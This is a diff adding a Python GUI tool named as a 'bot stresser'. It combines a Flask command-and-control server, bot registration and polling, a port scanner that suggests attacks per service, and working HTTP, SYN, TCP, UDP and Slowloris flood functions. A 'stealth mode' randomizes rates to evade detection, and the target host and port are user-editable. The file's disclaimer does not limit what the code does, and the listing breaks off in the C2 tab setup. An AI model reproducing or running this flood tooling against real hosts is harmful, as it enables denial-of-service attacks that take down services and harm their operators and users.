@@ -1,0 +1,981 @@
+# ai_bot_stresser_16_fixed.py - REAL-TIME VERSION WITH TCP FLOODING - USED WITH CARE ! DO NOT USE FOR ILLEGAL ACTIVITIES
+import tkinter as tk
+from tkinter import ttk, messagebox, scrolledtext
+import socket
+import random
+import time
+import threading
+import requests
+from scapy.all import IP, TCP, send, UDP
+import nmap
+from flask import Flask, request, jsonify
+from datetime import datetime
+import logging
+import sys
+import struct
+import queue  # Added missing import
+# Suppress Flask logging
+log = logging.getLogger('werkzeug')
+log.setLevel(logging.ERROR)
+# --- Global Variables ---
+C2_HOST = "127.0.0.1"
+C2_PORT = 5000
+C2_SERVER_RUNNING = False
+ACTIVE_BOTS = {}
+PACKETS_SENT = 0
+PACKETS_SENT_LOCK = threading.Lock()
+FAILED_PACKETS = 0
+FAILED_PACKETS_LOCK = threading.Lock()
+STEALTH_MODE = True
+RATE_LIMIT = 0.1
+OPEN_PORTS = []
+C2_SERVER_THREAD = None
+# --- Enhanced Bot Simulation Data ---
+BOT_OS_TYPES = [
+    {"name": "Windows 10", "arch": "x64", "priv": "user"},
+    {"name": "Windows 11", "arch": "x64", "priv": "admin"},
+    {"name": "Windows Server 2019", "arch": "x64", "priv": "system"},
+    {"name": "Ubuntu 20.04", "arch": "x64", "priv": "user"},
+    {"name": "Ubuntu 22.04", "arch": "x64", "priv": "root"},
+    {"name": "CentOS 8", "arch": "x64", "priv": "user"},
+    {"name": "CentOS 7", "arch": "x64", "priv": "root"},
+    {"name": "Debian 11", "arch": "x64", "priv": "user"},
+    {"name": "macOS Monterey", "arch": "ARM64", "priv": "user"},
+    {"name": "macOS Big Sur", "arch": "x64", "priv": "admin"},
+    {"name": "Android 12", "arch": "ARM64", "priv": "user"},
+    {"name": "Android 11", "arch": "ARM", "priv": "root"},
+    {"name": "iOS 15", "arch": "ARM64", "priv": "mobile"},
+    {"name": "iOS 16", "arch": "ARM64", "priv": "mobile"},
+    {"name": "Kali Linux", "arch": "x64", "priv": "root"},
+    {"name": "Parrot OS", "arch": "x64", "priv": "user"},
+    {"name": "Windows 7", "arch": "x64", "priv": "user"},
+    {"name": "Windows 8.1", "arch": "x64", "priv": "admin"},
+    {"name": "Raspberry Pi OS", "arch": "ARM", "priv": "pi"},
+    {"name": "Alpine Linux", "arch": "x64", "priv": "user"}
+]
+BOT_USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)",
+    "Mozilla/5.0 (Android 12; Mobile) AppleWebKit/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+]
+BOT_GEO_LOCATIONS = [
+    "US-NY", "US-CA", "US-TX", "UK-LN", "DE-BE", "FR-PA", "JP-TK",
+    "AU-SY", "CA-ON", "BR-SP", "IN-MU", "CN-SH", "RU-MS", "KR-SE"
+]
+# --- Integrated Scanner Class ---
+class Scanner:
+    COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
+    def scan_target(self, ip, ports_to_scan, result_list, stop_event):
+        print(f"[SCAN] Starting scan on {ip}")
+        for port in ports_to_scan:
+            if stop_event.is_set():
+                print(f"[SCAN] Scan for {ip} stopped by user.")
+                return
+            if self.isPortOpen(ip, port):
+                service = self.get_service_name(port)
+                result_list.append((f"{port}/{service}", self.get_attack_recommendation(port, service)))
+        print(f"[SCAN] Finished scan on {ip}")
+    def isPortOpen(self, ip, port):
+        connSkt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connSkt.settimeout(1)
+        try:
+            connSkt.connect((ip, int(port)))
+            connSkt.close()
+            return True
+        except socket.timeout:
+            pass
+        except ConnectionRefusedError:
+            pass
+        except socket.gaierror as ge:
+            print(f"[SCAN ERROR] Cannot resolve hostname/IP {ip}: {ge}")
+        except OSError as oe:
+            print(f"[SCAN ERROR] OS Error scanning {ip}:{port}: {oe}")
+        except Exception as e:
+            print(f"[SCAN ERROR] Unexpected error scanning {ip}:{port}: {e}")
+        finally:
+            try:
+                connSkt.close()
+            except:
+                pass
+        return False
+    def get_service_name(self, port):
+        services = {
+            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+            53: "DNS", 80: "HTTP", 110: "POP3", 143: "IMAP",
+            443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
+            5900: "VNC", 8080: "HTTP-Alt"
+        }
+        return services.get(port, "Unknown")
+    def get_attack_recommendation(self, port, service):
+        recs = {
+            80: "HTTP Flood", 443: "HTTPS Flood", 21: "FTP Brute Sim",
+            22: "SSH Brute Sim / Slowloris", 23: "Telnet Flood",
+            53: "DNS Amplification / UDP Flood", 8080: "HTTP Flood",
+            25: "SMTP Flood Sim", 110: "POP3 Flood Sim",
+            143: "IMAP Flood Sim", 3389: "RDP Brute Force",
+            3306: "MySQL Brute Force"
+        }
+        return recs.get(int(port), "Generic Flood")
+    def getIpAddressesFromRange(self, start, end):
+        try:
+            ipstruct = struct.Struct('>I')
+            start_packed = socket.inet_aton(start)
+            end_packed = socket.inet_aton(end)
+            start_int, = ipstruct.unpack(start_packed)
+            end_int, = ipstruct.unpack(end_packed)
+            if start_int > end_int:
+                raise ValueError("Start IP must be less than or equal to End IP")
+            return [socket.inet_ntoa(ipstruct.pack(i)) for i in range(start_int, end_int + 1)]
+        except Exception as e:
+            print(f"[SCAN ERROR] Invalid IP range {start}-{end}: {e}")
+            return []
+# --- Flask App for C2 Server ---
+c2_app = Flask(__name__)
+scanner_instance = Scanner()
+@c2_app.route('/register', methods=['POST'])
+def register_bot():
+    try:
+        data = request.json
+        bot_id = data.get('id')
+        ip = request.remote_addr
+        if bot_id:
+            # Use the bot_id directly as key for ACTIVE_BOTS
+            ACTIVE_BOTS[bot_id] = {
+                'ip': ip,
+                'last_seen': datetime.now().strftime("%H:%M:%S"),
+                'os': data.get('os', 'Unknown'),
+                'arch': data.get('arch', 'Unknown'),
+                'priv': data.get('priv', 'user'),
+                'location': data.get('location', 'Unknown'),
+                'user_agent': data.get('user_agent', 'Unknown'),
+                'session_id': None,
+                'start_time': time.time(),
+                'packet_count': 0
+            }
+            print(f"[C2] Bot registered: {bot_id} from {ip} | {data.get('os')} | {data.get('location')}")
+            return jsonify({"status": "registered", "command": "idle"})
+        else:
+            return jsonify({"status": "error", "message": "Bot ID missing"}), 400
+    except Exception as e:
+        print(f"[C2 ERROR] Registering bot: {e}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+@c2_app.route('/command/<bot_id>', methods=['GET'])
+def get_command(bot_id):
+    cmd = {"cmd": "idle"}
+    try:
+        if bot_id in ACTIVE_BOTS:
+            # Update last seen time
+            ACTIVE_BOTS[bot_id]['last_seen'] = datetime.now().strftime("%H:%M:%S")
+            # Check for pending command
+            if hasattr(SimplifiedStresserGUI, 'pending_command') and SimplifiedStresserGUI.pending_command:
+                cmd = SimplifiedStresserGUI.pending_command
+    except Exception as e:
+        print(f"[C2 ERROR] Getting command for {bot_id}: {e}")
+    return jsonify(cmd)
+def run_c2_server():
+    global C2_SERVER_RUNNING
+    try:
+        print(f"[C2] Starting server on http://{C2_HOST}:{C2_PORT}")
+        c2_app.run(host=C2_HOST, port=C2_PORT, threaded=True, debug=False, use_reloader=False)
+    except Exception as e:
+        print(f"[C2 ERROR] Failed to start server: {e}")
+    finally:
+        C2_SERVER_RUNNING = False
+# --- Bot Simulation Functions ---
+def generate_bot_id():
+    prefix = random.choice(['WIN', 'LNX', 'MAC', 'AND', 'IOS', 'RPI'])
+    suffix = ''.join(random.choices('0123456789ABCDEF', k=8))
+    return f"{prefix}-{suffix}"
+def get_random_bot_profile():
+    return random.choice(BOT_OS_TYPES)
+def get_random_user_agent():
+    return random.choice(BOT_USER_AGENTS)
+def get_random_location():
+    return random.choice(BOT_GEO_LOCATIONS)
+# --- Main GUI Class ---
+class SimplifiedStresserGUI:
+    pending_command = None
+    udp_flooding = False
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Simplified A.I BOT STRESSER - REAL TIME")
+        self.root.geometry("1300x850")
+        self.root.configure(bg='#0a0a1a')
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
+        self.bot_count = 0
+        self.bot_list_update_job = None
+        self.udp_flood_thread = None
+        self.port_scan_thread = None
+        self.scan_stop_event = threading.Event()
+        self.scan_button = None
+        self.running_bots = set()
+        self.running_bots_lock = threading.Lock()
+        self.realtime_log_queue = queue.Queue()
+        self.setup_ui()
+        # Start log processing thread
+        self.log_processing_thread = threading.Thread(target=self.process_logs, daemon=True)
+        self.log_processing_thread.start()
+    def setup_ui(self):
+        self.notebook = ttk.Notebook(self.root)
+        self.notebook.pack(fill='both', expand=True, padx=10, pady=10)
+        self.tab_main = ttk.Frame(self.notebook)
+        self.tab_attacks = ttk.Frame(self.notebook)
+        self.tab_c2 = ttk.Frame(self.notebook)
+        self.tab_pen_test = ttk.Frame(self.notebook)
+        self.tab_bot_sim = ttk.Frame(self.notebook)
+        self.notebook.add(self.tab_main, text='Dashboard')
+        self.notebook.add(self.tab_attacks, text='Stress Testing')
+        self.notebook.add(self.tab_c2, text='HTTP C2 Server')
+        self.notebook.add(self.tab_pen_test, text='Port Scanner')
+        self.notebook.add(self.tab_bot_sim, text='Bot Simulator')
+        self.setup_main_tab()
+        self.setup_attack_tab()
+        self.setup_c2_tab()
+        self.setup_pentest_tab()
+        self.setup_bot_sim_tab()
+        self.status_var = tk.StringVar(value="Ready")
+        self.status_bar = tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W, bg='#0a0a1a', fg='white')
+        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
+    def update_status(self, message):
+        self.status_var.set(f"Status: {message}")
+    def setup_main_tab(self):
+        frame = tk.Frame(self.tab_main, bg='#0a0a1a')
+        frame.pack(fill='both', expand=True, padx=20, pady=20)
+        stats_frame = tk.Frame(frame, bg='#0a0a1a')
+        stats_frame.pack(pady=10)
+        self.bot_var = tk.StringVar(value="0")
+        self.packet_var = tk.StringVar(value="0")
+        self.time_var = tk.StringVar(value=datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+        tk.Label(stats_frame, text="Bots: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
+        tk.Label(stats_frame, textvariable=self.bot_var, bg='#0a0a1a', fg='green').pack(side=tk.LEFT)
+        tk.Label(stats_frame, text=" | Packets: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
+        tk.Label(stats_frame, textvariable=self.packet_var, bg='#0a0a1a', fg='yellow').pack(side=tk.LEFT)
+        tk.Label(stats_frame, text=" | Time: ", bg='#0a0a1a', fg='white').pack(side=tk.LEFT)
+        tk.Label(stats_frame, textvariable=self.time_var, bg='#0a0a1a', fg='magenta').pack(side=tk.LEFT)
+        log_frame = tk.LabelFrame(frame, text="Activity Log", bg='#0a0a1a', fg='white')
+        log_frame.pack(fill='both', expand=True, padx=10, pady=10)
+        self.log_text = scrolledtext.ScrolledText(log_frame, bg='#1a1a2a', fg='white', state='disabled')
+        self.log_text.pack(fill='both', expand=True, padx=5, pady=5)
+        class TextRedirector:
+            def __init__(self, widget, gui_root):
+                self.widget = widget
+                self.gui_root = gui_root
+            def write(self, str):
+                try:
+                    if self.widget and self.widget.winfo_exists():
+                        self.gui_root.after_idle(self._update_widget, str)
+                except tk.TclError:
+                    pass
+            def _update_widget(self, str):
+                try:
+                    if self.widget and self.widget.winfo_exists():
+                        self.widget.configure(state='normal')
+                        self.widget.insert(tk.END, str)
+                        self.widget.see(tk.END)
+                        self.widget.configure(state='disabled')
+                except tk.TclError:
+                    pass
+            def flush(self):
+                pass
+        sys.stdout = TextRedirector(self.log_text, self.root)
+        print("[INFO] Simplified Application started.")
+    def setup_attack_tab(self):
+        frame = tk.Frame(self.tab_attacks, bg='#0a0a1a')
+        frame.pack(fill='both', expand=True, padx=20, pady=20)
+        target_frame = tk.LabelFrame(frame, text="Target Configuration", bg='#0a0a1a', fg='white')
+        target_frame.pack(fill='x', pady=10)
+        tk.Label(target_frame, text="Target Host:", bg='#0a0a1a', fg='white').grid(row=0, column=0, sticky='w', padx=5, pady=5)
+        self.target_host = tk.Entry(target_frame, width=20, bg='#1a1a2a', fg='white')
+        self.target_host.insert(0, "127.0.0.1")
+        self.target_host.grid(row=0, column=1, padx=5, pady=5)
+        tk.Label(target_frame, text="Target Port:", bg='#0a0a1a', fg='white').grid(row=0, column=2, sticky='w', padx=5, pady=5)
+        self.target_port = tk.Entry(target_frame, width=10, bg='#1a1a2a', fg='white')
+        self.target_port.insert(0, "80")
+        self.target_port.grid(row=0, column=3, padx=5, pady=5)
+        attack_frame = tk.LabelFrame(frame, text="Attack Type", bg='#0a0a1a', fg='white')
+        attack_frame.pack(fill='x', pady=10)
+        self.attack_type = tk.StringVar(value="HTTP Flood")
+        attack_types = ["HTTP Flood", "SYN Flood", "TCP Flood", "UDP Flood", "Slowloris"]
+        for i, atype in enumerate(attack_types):
+            tk.Radiobutton(attack_frame, text=atype, variable=self.attack_type, value=atype, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').grid(row=0, column=i, sticky='w', padx=10)
+        bot_frame = tk.LabelFrame(frame, text="Bot Control", bg='#0a0a1a', fg='white')
+        bot_frame.pack(fill='x', pady=10)
+        tk.Button(bot_frame, text="Add 10 Bots", command=lambda: self.add_bots(10), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(bot_frame, text="Add 50 Bots", command=lambda: self.add_bots(50), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(bot_frame, text="Add 100 Bots", command=lambda: self.add_bots(100), bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(bot_frame, text="Stop All Bots", command=self.stop_all_bots, bg='#4d3333', fg='white').pack(side=tk.RIGHT, padx=5)
+        mode_frame = tk.LabelFrame(frame, text="Advanced Modes", bg='#0a0a1a', fg='white')
+        mode_frame.pack(fill='x', pady=10)
+        tk.Button(mode_frame, text="Toggle Stealth Mode", command=self.toggle_stealth, bg='#334d33', fg='white').pack(side=tk.LEFT, padx=5)
+        self.stealth_var = tk.StringVar(value="OFF")
+        tk.Label(mode_frame, textvariable=self.stealth_var, bg='#0a0a1a', fg='white').pack(side=tk.LEFT, padx=5)
+        advanced_frame = tk.LabelFrame(frame, text="Advanced Bot Simulation", bg='#0a0a1a', fg='white')
+        advanced_frame.pack(fill='x', pady=10)
+        self.geo_distribution_var = tk.BooleanVar(value=True)
+        tk.Checkbutton(advanced_frame, text="Enable Geographic Distribution", variable=self.geo_distribution_var, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').pack(side=tk.LEFT, padx=5)
+        self.realistic_behavior_var = tk.BooleanVar(value=True)
+        tk.Checkbutton(advanced_frame, text="Enable Realistic Behavior", variable=self.realistic_behavior_var, bg='#0a0a1a', fg='white', selectcolor='#0a0a1a').pack(side=tk.LEFT, padx=5)
+        udp_test_frame = tk.LabelFrame(frame, text="Local UDP Flood Test", bg='#0a0a1a', fg='white')
+        udp_test_frame.pack(fill='x', pady=10)
+        tk.Button(udp_test_frame, text="Start Local UDP Flood", command=self.start_local_udp_flood, bg='#33334d', fg='white').pack(side=tk.LEFT, padx=5)
+        tk.Button(udp_test_frame, text="Stop Local UDP Flood", command=self.stop_local_udp_flood, bg='#4d3333', fg='white').pack(side=tk.LEFT, padx=5)
+        self.udp_status_var = tk.StringVar(value="Stopped")
+        tk.Label(udp_test_frame, textvariable=self.udp_status_var, bg='#0a0a1a', fg='white').pack(side=tk.LEFT, padx=5)
+    def toggle_stealth(self):
+        global STEALTH_MODE, RATE_LIMIT
+        STEALTH_MODE = not STEALTH_MODE
+        RATE_LIMIT = random.uniform(0.5, 2.0) if STEALTH_MODE else 0.1
+        self.stealth_var.set("ON" if STEALTH_MODE else "OFF")
+        self.update_status(f"Stealth Mode: {'ON' if STEALTH_MODE else 'OFF'}")
+    def add_bots(self, count):
+        target = self.target_host.get()
+        port = self.target_port.get()
+        attack_type = self.attack_type.get()
+        if not target or not port:
+            messagebox.showerror("Error", "Target and port required!")
+            return
+        try:
+            port = int(port)
+        except ValueError:
+            messagebox.showerror("Error", "Port must be a number!")
+            return
+        for i in range(count):
+            bot_id = generate_bot_id()
+            bot_profile = get_random_bot_profile()
+            user_agent = get_random_user_agent()
+            location = get_random_location() if self.geo_distribution_var.get() else "Unknown"
+            bot_thread = threading.Thread(
+                target=self.simulate_bot,
+                args=(bot_id, target, port, attack_type, bot_profile, user_agent, location),
+                daemon=True
+            )
+            with self.running_bots_lock:
+                self.running_bots.add(bot_id)
+            bot_thread.start()
+            self.bot_count += 1
+        self.bot_var.set(str(self.bot_count))
+        self.update_status(f"Launched {count} bots targeting {target}:{port}")
+    def simulate_bot(self, bot_id, target, port, attack_type, bot_profile, user_agent, location):
+        global PACKETS_SENT, FAILED_PACKETS
+        print(f"[BOT {bot_id}] Waiting 10 seconds before attempting registration...")
+        time.sleep(10)
+        print(f"[BOT {bot_id}] Attempting registration...")
+        registration_success = False
+        max_registration_attempts = 3
+        registration_attempt = 0
+        while not registration_success and registration_attempt < max_registration_attempts:
+            registration_attempt += 1
+            print(f"[BOT {bot_id}] Attempting registration (Attempt {registration_attempt}/{max_registration_attempts})...")
+            try:
+                reg_data = {
+                    "id": bot_id,
+                    "os": bot_profile["name"],
+                    "arch": bot_profile["arch"],
+                    "priv": bot_profile["priv"],
+                    "user_agent": user_agent,
+                    "location": location
+                }
+                response = requests.post(f"http://{C2_HOST}:{C2_PORT}/register", json=reg_data, timeout=5)
+                if response.status_code == 200:
+                    registration_success = True
+                    print(f"[BOT {bot_id}] Registration successful.")
+                else:
+                    print(f"[BOT {bot_id}] Registration failed (HTTP {response.status_code}): {response.text}")
+            except requests.exceptions.ConnectionError:
+                print(f"[BOT {bot_id}] Registration failed: Cannot connect to C2 server.")
+            except requests.exceptions.Timeout:
+                print(f"[BOT {bot_id}] Registration failed: Request timed out.")
+            except requests.exceptions.RequestException as e:
+                print(f"[BOT {bot_id}] Registration failed (Request Error): {e}")
+            except Exception as e:
+                print(f"[BOT {bot_id}] Registration failed (Unexpected Error): {e}")
+            if not registration_success and registration_attempt < max_registration_attempts:
+                retry_delay = 5 * registration_attempt
+                print(f"[BOT {bot_id}] Retrying registration in {retry_delay} seconds...")
+                time.sleep(retry_delay)
+            elif not registration_success:
+                print(f"[BOT {bot_id}] Registration failed after {max_registration_attempts} attempts.")
+        
+        ATTACK_RUNNING = False
+        # Timer to track bot activity
+        start_time = time.time()
+        packet_count = 0
+        last_update_time = time.time()
+        
+        while True:
+            try:
+                if registration_success:
+                    response = requests.get(f"http://{C2_HOST}:{C2_PORT}/command/{bot_id}", timeout=5)
+                    if response.status_code == 200:
+                        try:
+                            resp = response.json()
+                        except ValueError:
+                            print(f"[BOT {bot_id}] Invalid JSON response")
+                            time.sleep(10)
+                            continue
+                        cmd = resp.get("cmd")
+                        if cmd == "attack":
+                            ATTACK_RUNNING = True
+                            attack_details = resp
+                            current_target = attack_details.get("target", target)
+                            current_port = int(attack_details.get("port", port))
+                            current_attack_type = attack_details.get("type", attack_type)
+                            while ATTACK_RUNNING:
+                                try:
+                                    delay = RATE_LIMIT if STEALTH_MODE else (random.uniform(0.1, 1.0) if self.realistic_behavior_var.get() else random.uniform(0.01, 0.05))
+                                    time.sleep(delay)
+                                    if current_attack_type == "HTTP Flood":
+                                        try:
+                                            self.http_flood(current_target, current_port, user_agent)
+                                        except Exception as e:
+                                            with FAILED_PACKETS_LOCK:
+                                                FAILED_PACKETS += 1
+                                            print(f"[BOT {bot_id}] HTTP Flood error: {e}")
+                                    elif current_attack_type == "SYN Flood":
+                                        try:
+                                            self.syn_flood(current_target, current_port)
+                                        except Exception as e:
+                                            with FAILED_PACKETS_LOCK:
+                                                FAILED_PACKETS += 1
+                                            print(f"[BOT {bot_id}] SYN Flood error: {e}")
+                                    elif current_attack_type == "TCP Flood":
+                                        try:
+                                            self.tcp_flood(current_target, current_port, bot_profile)
+                                        except Exception as e:
+                                            with FAILED_PACKETS_LOCK:
+                                                FAILED_PACKETS += 1
+                                            print(f"[BOT {bot_id}] TCP Flood error: {e}")
+                                    elif current_attack_type == "UDP Flood":
+                                        try:
+                                            self.udp_flood(current_target, current_port, connections=100, delay=0)
+                                        except Exception as e:
+                                            with FAILED_PACKETS_LOCK:
+                                                FAILED_PACKETS += 1
+                                            print(f"[BOT {bot_id}] UDP Flood error: {e}")
+                                    elif current_attack_type == "Slowloris":
+                                        try:
+                                            self.slowloris(current_target, current_port)
+                                        except Exception as e:
+                                            with FAILED_PACKETS_LOCK:
+                                                FAILED_PACKETS += 1
+                                            print(f"[BOT {bot_id}] Slowloris error: {e}")
+                                    with PACKETS_SENT_LOCK:
+                                        PACKETS_SENT += 1
+                                        packet_count += 1
+                                        current_packets = PACKETS_SENT
+                                    
+                                    # Real-time logging with timer
+                                    elapsed_time = time.time() - start_time
+                                    current_time = datetime.now().strftime("%H:%M:%S")
+                                    log_msg = f"[BOT {bot_id}] [{elapsed_time:.2f}s] Packet #{packet_count} sent - {current_attack_type} - {current_time}"
+                                    self.realtime_log_queue.put(log_msg)
+                                    
+                                    # Update packet counter periodically
+                                    if current_packets % 100 == 0:
+                                        try:
+                                            if self.root.winfo_exists():
+                                                self.root.after(0, self._safe_update_packet_var, str(current_packets))
+                                        except tk.TclError:
+                                            pass
+                                except Exception as e:
+                                    with FAILED_PACKETS_LOCK:
+                                        FAILED_PACKETS += 1
+                                    print(f"[BOT {bot_id}] Attack loop error: {e}")
+                                    time.sleep(1)
+                        elif cmd == "stop":
+                            ATTACK_RUNNING = False
+                            print(f"[BOT {bot_id}] Attack stopped by C2.")
+                            break
+                    else:
+                        print(f"[BOT {bot_id}] C2 Communication error (HTTP {response.status_code})")
+                        time.sleep(10)
+                time.sleep(5)
+            except Exception as e:
+                print(f"[BOT {bot_id}] General error: {e}")
+                time.sleep(15)
+        with self.running_bots_lock:
+            self.running_bots.discard(bot_id)
+            self.bot_count = len(self.running_bots)
+        try:
+            if self.root.winfo_exists():
+                self.root.after(0, lambda: self.bot_var.set(str(self.bot_count)))
+        except tk.TclError:
+            pass
+        print(f"[BOT {bot_id}] Thread finished.")
+    
+    def process_logs(self):
+        """Process log messages in real-time"""
+        while True:
+            try:
+                log_message = self.realtime_log_queue.get(timeout=1)
+                if log_message:
+                    # Update GUI in main thread
+                    self.root.after(0, self._update_log_display, log_message)
+                self.realtime_log_queue.task_done()
+            except queue.Empty:
+                continue
+            except Exception as e:
+                print(f"[LOG ERROR] Processing log: {e}")
+                continue
+    
+    def _update_log_display(self, message):
+        """Update the log display with real-time messages"""
+        try:
+            if self.log_text and self.log_text.winfo_exists():
+                self.log_text.configure(state='normal')
+                self.log_text.insert(tk.END, message + "\n")
+                self.log_text.see(tk.END)
+                self.log_text.configure(state='disabled')
+        except tk.TclError:
+            pass
+    
+    def _safe_update_packet_var(self, value):
+        try:
+            if self.packet_var:
+                self.packet_var.set(value)
+        except tk.TclError:
+            pass
+    def http_flood(self, target, port, user_agent):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)
+            s.connect((target, port))
+            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\n\r\n"
+            s.send(request.encode())
+            s.close()
+        except Exception:
+            pass
+    def syn_flood(self, target, port):
+        try:
+            ip = IP(dst=target)
+            tcp = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
+            send(ip/tcp, verbose=0)
+        except Exception:
+            pass
+    def tcp_flood(self, target, port, bot_profile):
+        """
+        Simulate TCP flood based on bot's intended user profile
+        Different behaviors for different OS types and privileges
+        """
+        try:
+            # Determine TCP flood characteristics based on bot profile
+            os_name = bot_profile["name"]
+            priv_level = bot_profile["priv"]
+            
+            # Configure flood parameters based on bot characteristics
+            if "Windows" in os_name:
+                # Windows-based bots typically use higher connection rates
+                num_connections = random.randint(5, 15)
+                delay = random.uniform(0.01, 0.1)
+            elif "Linux" in os_name or "Ubuntu" in os_name or "Debian" in os_name:
+                # Linux-based bots can handle more connections
+                num_connections = random.randint(10, 30)
+                delay = random.uniform(0.005, 0.05)
+            elif "Android" in os_name or "iOS" in os_name:
+                # Mobile devices have limited resources
+                num_connections = random.randint(2, 8)
+                delay = random.uniform(0.1, 0.5)
+            else:
+                # Default behavior
+                num_connections = random.randint(5, 20)
+                delay = random.uniform(0.01, 0.2)
+            
+            # Adjust based on privilege level
+            if priv_level == "root" or priv_level == "system":
+                # High privilege bots can create more connections
+                num_connections *= 2
+            elif priv_level == "admin":
+                # Admin level bots moderate behavior
+                num_connections = int(num_connections * 1.5)
+            
+            # Create TCP connections
+            for i in range(num_connections):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(1)
+                    sock.connect((target, port))
+                    sock.close()
+                    time.sleep(delay)
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            print(f"[TCP FLOOD ERROR] {e}")
+    
+    def udp_flood(self, target, port, connections=100, delay=0):
+        global PACKETS_SENT, FAILED_PACKETS
+        try:
+            target_ip = socket.gethostbyname(target)
+            for i in range(connections):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.sendto(random._urandom(1024), (target_ip, port))
+                    sock.close()
+                    with PACKETS_SENT_LOCK:
+                        PACKETS_SENT += 1
+                except Exception:
+                    with FAILED_PACKETS_LOCK:
+                        FAILED_PACKETS += 1
+                if delay > 0:
+                    time.sleep(delay / 1000.0)
+        except Exception:
+            with FAILED_PACKETS_LOCK:
+                FAILED_PACKETS += 1
+    def slowloris(self, target, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((target, port))
+            s.send(b"GET / HTTP/1.1\r\n")
+            time.sleep(30)
+            s.close()
+        except Exception:
+            pass
+    def stop_all_bots(self):
+        with self.running_bots_lock:
+            if not self.running_bots:
+                self.update_status("No bots are currently running.")
+                return
+        SimplifiedStresserGUI.pending_command = {"cmd": "stop"}
+        self.update_status("Stop command sent to all bots")
+        def clear_pending():
+            time.sleep(2)
+            SimplifiedStresserGUI.pending_command = None
+        threading.Thread(target=clear_pending, daemon=True).start()
+    def start_local_udp_flood(self):
+        if self.udp_flooding:
+            self.update_status("UDP Flood is already running.")
+            return
+        target = self.target_host.get()
+        port_str = self.target_port.get()
+        if not target or not port_str:
+            messagebox.showerror("Error", "Target and port required!")
+            return
+        try:
+            port = int(port_str)
+        except ValueError:
+            messagebox.showerror("Error", "Port must be a number!")
+            return
+        self.udp_flooding = True
+        self.udp_status_var.set("Running")
+        self.udp_flood_thread = threading.Thread(target=self._run_local_udp_flood, args=(target, port), daemon=True)
+        self.udp_flood_thread.start()
+        self.update_status(f"Started local UDP flood on {target}:{port}")
+    def _run_local_udp_flood(self, target, port):
+        global PACKETS_SENT, FAILED_PACKETS
+        connections = 500
+        start_time = time.time()
+        packet_count = 0
+        try:
+            target_ip = socket.gethostbyname(target)
+            for i in range(connections):
+                if not self.udp_flooding:
+                    break
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.sendto(random._urandom(1024), (target_ip, port))
+                    sock.close()
+                    with PACKETS_SENT_LOCK:
+                        PACKETS_SENT += 1
+                        packet_count += 1
+                        current_packets = PACKETS_SENT
+                    # Real-time logging with timer
+                    elapsed_time = time.time() - start_time
+                    current_time = datetime.now().strftime("%H:%M:%S")
+                    log_msg = f"[LOCAL UDP FLOOD] [{elapsed_time:.2f}s] Packet #{packet_count} sent - {current_time}"
+                    self.realtime_log_queue.put(log_msg)
+                    
+                    if current_packets % 50 == 0:
+                        try:
+                            if self.root.winfo_exists():
+                                self.root.after(0, self._safe_update_packet_var, str(current_packets))
+                        except tk.TclError:
+                            pass
+                except Exception:
+                    with FAILED_PACKETS_LOCK:
+                        FAILED_PACKETS += 1
+        except Exception:
+            with FAILED_PACKETS_LOCK:
+                FAILED_PACKETS += 1
+        finally:
+            self.udp_flooding = False
+            try:
+                if self.root.winfo_exists():
+                    self.root.after(0, lambda: self.udp_status_var.set("Stopped"))
+                    with PACKETS_SENT_LOCK:
+                        final_count = str(PACKETS_SENT)
+                    self.root.after(0, self._safe_update_packet_var, final_count)
+            except tk.TclError:
+                pass
+    def stop_local_udp_flood(self):
+        self.udp_flooding = False
+        self.update_status("Stopping local UDP flood...")
+        if self.udp_flood_thread and self.udp_flood_thread.is_alive():
+            self.udp_flood_thread.join(timeout=2)
+        self.udp_status_var.set("Stopped")
+        try:
+            with PACKETS_SENT_LOCK:
+                self._safe_update_packet_var(str(PACKETS_SENT))
+        except:
+            pass
+    def setup_c2_tab(self):
+        frame = tk.Frame(self.tab_c2, bg='#0a0a1a')
+        frame.pack(fill='both', expand=True, padx=20, pady=20)
+        server_frame = tk.LabelFrame(frame, text="C2 Server Control", bg='#0a0a1a', fg='white')
+        server_frame.pack(fill='x', pady=10)
